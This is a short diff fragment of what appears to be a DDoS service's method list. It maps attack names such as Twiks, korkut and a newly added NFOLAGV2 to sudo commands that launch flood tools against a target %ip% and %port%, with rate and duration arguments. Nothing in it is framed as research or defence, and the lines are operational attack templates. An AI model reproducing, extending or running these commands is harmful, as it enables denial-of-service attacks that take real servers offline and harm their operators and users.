@@ -55,3 +55,5 @@ Twiks : sudo ./Twiks %ip% %port%
 35 : sudo perl 35.pl %ip% %port% 1000 300
 
 korkut : sudo ./korkut2 %ip% %port% 10 -1 9999
+
+NFOLAGV2 : sudo ./NFOLagv2 %ip% %port% 1025 0
